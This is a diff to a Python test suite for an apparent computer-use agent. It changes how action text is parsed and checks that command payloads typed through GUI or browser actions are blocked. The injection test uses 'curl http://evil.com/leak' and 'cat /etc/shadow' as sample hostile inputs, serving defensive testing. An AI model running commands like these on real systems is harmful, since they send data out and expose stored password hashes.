@@ -120,7 +120,7 @@ def test_normalize_app_name(raw, expected):
 # 3. Action Parsing and Pseudo-Command Reclassification Tests
 # ---------------------------------------------------------------------------
 
-def test_parse_llm_action_reclassifies_launch_to_app_launch():
+def test_parse_llm_action_does_not_reinterpret_terminal_launch_prose():
     text = (
         "THOUGHT: Launch code-server to inspect codebase\n"
         "ACTION: TERMINAL_EXEC\n"
@@ -129,12 +129,12 @@ def test_parse_llm_action_reclassifies_launch_to_app_launch():
         "EXPECTED: code-server starts\n"
     )
     act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
-    assert act_type == ComputerActionType.APP_LAUNCH
-    assert target == "code-server"
-    assert payload.get("app_name") == "code-server"
+    assert act_type == ComputerActionType.TERMINAL_EXEC
+    assert target == "Launch code-server"
+    assert payload.get("command") == "Launch code-server"
 
 
-def test_parse_llm_action_reclassifies_navigate_to_browser():
+def test_parse_llm_action_does_not_reinterpret_terminal_navigation_prose():
     text = (
         "THOUGHT: Navigate to the target web page\n"
         "ACTION: TERMINAL_EXEC\n"
@@ -143,9 +143,9 @@ def test_parse_llm_action_reclassifies_navigate_to_browser():
         "EXPECTED: Page loads\n"
     )
     act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
-    assert act_type == ComputerActionType.BROWSER_NAVIGATE
-    assert target == "https://example.com/api"
-    assert payload.get("url") == "https://example.com/api"
+    assert act_type == ComputerActionType.TERMINAL_EXEC
+    assert target == "navigate to https://example.com/api"
+    assert payload.get("command") == "navigate to https://example.com/api"
 
 
 def test_parse_llm_action_preserves_dynamic_which_query():
@@ -260,7 +260,7 @@ def test_target_injected_at_top_of_observation():
     assert "TARGET URLS: https://target.internal.io:9000" in obs_summary
     assert obs_summary.startswith("TARGET URLS:")
     # Compact mode uses compact system prompt
-    assert "Do NOT run trivial commands like pwd" in system_prompt
+    assert "Universal Anti-Bypass Invariant" in system_prompt
 
 
 def test_observation_caps_huge_screen_and_files():
@@ -422,18 +422,18 @@ async def test_prevent_shell_command_injection_in_ui_execute():
     agent = ComputerUseAgent(computer_provider=provider)
 
     # 1. GUI_TYPE with command payload does NOT type the shell command
-    await agent.execute_action(
+    gui_trace = await agent.execute_action(
         "ws-1",
         ComputerActionType.GUI_TYPE,
         "input",
         {"command": "curl http://evil.com/leak"},
         "typing text",
     )
-    last_gui = provider.gui_actions_taken[-1]
-    assert getattr(last_gui, "text", "") == ""
+    assert gui_trace.status == ActionExecutionStatus.BLOCKED
+    assert provider.gui_actions_taken == []
 
     # 2. BROWSER_TYPE without BrowserAgent via GUI keyboard also does not inject command
-    await agent.execute_action(
+    browser_trace = await agent.execute_action(
         "ws-1",
         ComputerActionType.BROWSER_TYPE,
         "input#search",
@@ -443,6 +443,7 @@ async def test_prevent_shell_command_injection_in_ui_execute():
     # The last action should not type "cat /etc/shadow"
     typed_texts = [getattr(a, "text", "") for a in provider.gui_actions_taken if hasattr(a, "text")]
     assert "cat /etc/shadow" not in typed_texts
+    assert browser_trace.status == ActionExecutionStatus.BLOCKED
 
 
 # ---------------------------------------------------------------------------
@@ -486,12 +487,12 @@ async def test_non_destructive_gui_recovery():
 
     # Normal GUI error triggers non-destructive recovery
     result = await agent.recover("ws-1", ComputerActionType.GUI_CLICK, "Button occluded")
-    assert result == "Refreshed desktop focus and dismissed modal overlays"
+    assert result == "Refreshed desktop focus and window state"
     # Verify xvfb was NOT restarted
     assert ("xvfb", "restart") not in provider.service_actions_taken
-    # Verify Escape key was sent
+    # Recovery preserves the current UI state instead of dismissing overlays.
     escapes = [a for a in provider.gui_actions_taken if getattr(a, "key", "") == "Escape"]
-    assert len(escapes) >= 1
+    assert escapes == []
 
     # Explicit display connection error DOES trigger xvfb restart
     result_display = await agent.recover("ws-1", ComputerActionType.GUI_CLICK, "Error: cannot open display :0")
@@ -636,4 +637,3 @@ async def test_tool_author_direct_script_writing_completes():
     )
     assert trace.status == ActionExecutionStatus.COMPLETED
     assert "Authored script at" in trace.actual_observation
-
